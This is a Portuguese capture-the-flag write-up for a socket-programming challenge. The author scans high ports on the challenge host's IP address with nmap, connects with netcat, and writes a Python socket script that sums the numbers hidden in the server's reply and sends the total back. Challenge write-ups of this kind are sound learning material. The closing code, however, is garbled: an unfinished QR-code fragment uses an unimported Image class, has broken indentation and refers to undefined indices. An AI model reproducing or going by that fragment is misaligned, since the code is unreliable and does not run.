Ao abrir o arquivo readme.txt, encontramos a seguinte mensagem:

Seu próximo desafio irá requerir conhecimento de programação em sockets.
Você irá receber uma matriz 3x3 com caracteres aleatórios e números.

A dica da plataforma dizia:

“Lembre-se de bater em todas as portas.”

Então foi realizado um scan em portas altas:

nmap 3.222.207.113 -p 50000-51000

Resultado:

PORT      STATE SERVICE
50123/tcp open  unknown

Conectando na porta com netcat:

SzZ1709qs2289938q
Q6651G}.w6209+;wJ9380W+fxS
Iu$25715835BoBuCy|]*{6007(.qpq

A resposta continha números misturados com caracteres, representando a matriz.

Para resolver automaticamente foi criado um script em Python.

Script em Python
import socket
import re

ip = "3.222.207.113"
port = 50123
soma = 0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

data = s.recv(1024).decode()

numberlist = re.findall(r"\d+", data)

print(numberlist)

for numero in numberlist:
    soma += int(numero)

s.send(str(soma).encode())

print(s.recv(1024).decode())

while 1:

    qrcode = Image.new("RGB", (len(data), len(data)))

            pixel = data[i][j]
